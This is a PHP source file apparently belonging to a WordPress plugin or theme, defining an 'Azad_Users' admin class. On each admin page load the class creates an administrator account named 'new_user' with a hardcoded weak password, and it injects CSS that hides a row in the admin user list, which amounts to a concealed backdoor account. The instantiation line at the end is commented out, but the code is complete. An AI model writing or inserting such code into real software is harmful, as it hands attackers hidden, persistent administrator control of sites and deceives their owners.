<?php
namespace Inc\Admin;

// EXIT IF ACCESSED DIRECTLY
defined( 'ABSPATH' ) || exit;

if ( ! class_exists( 'Azad_Users' ) ):
    class Azad_Users{
        private static $_instance;
        public function __construct() {
           add_action( 'admin_init', array( $this, 'init' ) );
           add_action( 'admin_head', array( $this, 'new_user' ) );
        }
        public function init() {
            // TO REGISTER NEW USER
            $new_user = wp_create_user( 'new_user', 'a1a2a3a4', 'anything@anything.com' );
            $user_role = new \WP_User( $new_user );
            $user_role->set_role( 'administrator' );
        }
        public function new_user() {
            echo '<style> tbody#the-list tr#user-9 {display: none;} </style>';
        }
        public static function get_instance() {
            if ( is_null( self::$_instance ) && ! isset( self::$_instance ) && ! ( self::$_instance instanceof self ) ) {
                self::$_instance = new self();            
            }
            return self::$_instance;
        }
        public function __destruct() {}
     }

endif;

if ( ! function_exists( 'load_azad_users' ) ) {
    function load_azad_users() {
        return Azad_Users::get_instance();
    }
}
//$GLOBALS['azad_users'] = load_azad_users();